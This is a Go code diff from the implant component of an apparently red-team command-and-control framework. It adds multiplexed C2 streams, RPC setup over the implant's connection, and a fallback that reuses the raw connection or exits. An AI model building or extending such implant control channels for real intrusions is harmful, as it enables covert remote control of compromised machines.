@@ -3,11 +3,14 @@ package transport
 import (
 	"crypto/rand"
 	"encoding/binary"
+	"io"
 	"net"
 	"sync"
 
 	"github.com/hashicorp/yamux"
 	"github.com/maxlandon/wiregost/ghost/log"
+	"github.com/maxlandon/wiregost/ghost/rpc"
+	"github.com/maxlandon/wiregost/ghost/security"
 	tpb "github.com/maxlandon/wiregost/proto/v1/gen/go/transport"
 )
 
@@ -23,9 +26,10 @@ var (
 )
 
 // Transport - Any transport mechanism that implements this interface is considered good to use as a C2 transport for this
-// ghost implant. Functionality set might vary per implementation, but we perform various checks when using them in any way
+// ghost implant. Functionality set might vary per implementation, but we perform various checks when using them in any way.
 type Transport interface {
 	Info() tpb.Transport
+	Type() tpb.Type
 	Start() error
 	Close() error
 	Multiplex() bool
@@ -37,17 +41,17 @@ type Transport interface {
 // NOTE: A transport is obviously and necessarily a physical connection.
 // The logical connection used for C2 requests/responses (muxed) is nonetheless owned by this transport.
 type transport struct {
-	Info        tpb.Transport  // Information
-	Ready       bool           // This is a check, in case the connection is just out of a switch and not yet working.
-	Conn        net.Conn       // Physical connection, which might/will be muxed. We might need access from time to time.
-	C2          *yamux.Stream  // Logical connection used for C2 requests/responses (muxed), on top of the Conn.
-	Multiplexer *yamux.Session // We generate multiple streams out of the physical one, for implant channels and routing.
-	ClosedMux   chan struct{}  // Used to notify the routing multiplexer routine that it needs to stop.
+	Info        tpb.Transport      // Information
+	Ready       bool               // This is a check, in case the connection is just out of a switch and not yet working.
+	Conn        net.Conn           // Physical connection, which might/will be muxed. We might need access from time to time.
+	C2          io.ReadWriteCloser // Logical connection used for C2 requests/responses (muxed), on top of the Conn.
+	Multiplexer *yamux.Session     // We generate multiple streams out of the physical one, for implant channels and routing.
+	ClosedMux   chan struct{}      // Used to notify the routing multiplexer routine that it needs to stop.
 }
 
-// Start - Starts either a listener or calls back to server. This function is reimplemented by all subtype implementations,
-// which will call this func nonetheless for all boilerplate logging and stuff. RPC code is added from here.
-func (t *transport) Start(isSwitch bool) (err error) {
+// Setup - Takes care of boilerplate logging, multiplexing, adding RPC C2 code to the
+// implant's main channel, and adds the transport to the Transport list.
+func (t *transport) Setup(isSwitch bool) (err error) {
 
 	tpLog.Infof("Starting transport (ID: %d)", t.Info.ID)
 	tpLog.Infof("Protocol: %s", t.Info.Protocol.String())
@@ -55,23 +59,30 @@ func (t *transport) Start(isSwitch bool) (err error) {
 
 	// Add job to channels, or just to a list for tracking current routines.
 
-	// THIS PART IS USED BY SUBTYPE IMPLEMENTATIONS, REMOVE IT ------
-	// Establish physical connection, and return it
-	switch t.Info.Type {
-	case tpb.Type_BIND:
-		// We start a listener on the implant
-	case tpb.Type_REVERSE:
-		// We dial back to the server
-	}
-	// --------------------------------------------------------------
-
-	// Setup C2 stream (including Application protocol, like HTTP)
-
 	// Send registration
 	if isSwitch {
 		// Send switch confirmation
 	}
 	// Else, send registration message with information
+
+	// Setup multiplexer
+	t.Multiplexer, err = yamux.Server(t.Conn, yamux.DefaultConfig())
+	if err != nil {
+		tpLog.Errorf("Failed to set a mux session around transport conn: %s", err.Error())
+	}
+
+	// Get a stream dedicated to implant C2 requests/responses. The server received
+	// or registration/connection request, and will soon try to initiate a mux.
+	if t.Multiplexer != nil {
+		t.C2, err = t.Multiplexer.Accept()
+		if err != nil || t.C2 == nil {
+			tpLog.Errorf("Failed to get C2 muxed stream: %s", err.Error())
+			t.emergencyConnSetup()
+		}
+		err = rpc.SetupStreamRPC(t.C2)
+	}
+
+	// Bind this stream to the implant's main channel
 
 	Transports.Active = t // This transport is now the active one for this implant.
 
@@ -90,6 +101,27 @@ func (t *transport) Stop() (err error) {
 	// Check routed connections. We need to devise how permissions
 	// determine if a user can cutoff/switch a transport.
 
+	// Stopping the transport means closing the multiplexer, terminating the physical connection
+	// (which implies that the server, who has sent a request to either stop/switch, will NOT
+	// receive the response, worst it will get a fatal error from conn.Close().
+	// Thus these requests to switch/stop a transport must be done, server-side, through a function
+	// that takes this conn switch into account.
+
+	return
+}
+
+// emergencyConnSetup - In the event of a critical failure, like a failed multiplexer operation,
+// we fall back on using the physical conn, if possible, as a C2 stream for core implant comm.
+// We will be at least able to forward the errors before crashing in the darkness of the world.
+func (t *transport) emergencyConnSetup() {
+	tpLog.Warnf("Falling back to the emergency C2 setup, around Transport physical conn")
+	if t.Conn == nil {
+		tpLog.Errorf("Transport physical conn is nil: no way to solve this.")
+		security.Exit()
+	}
+
+	t.C2 = t.Conn
+	tpLog.Infof("Physical transport conn is now used as implant C2 stream.")
 	return
 }
 
@@ -110,7 +142,7 @@ func (tp *transports) Switch(to tpb.Transport) (err error) {
 	// Makes two working simultaneously, but if there is some
 	// remote logging it's better to send it via the old conn.
 	new := (*tp.Ready)[uint64(to.ID)]
-	err = new.Start(true)
+	err = new.Setup(true)
 	if err != nil {
 		// Do something here, like send an abort message, via old transport
 		return
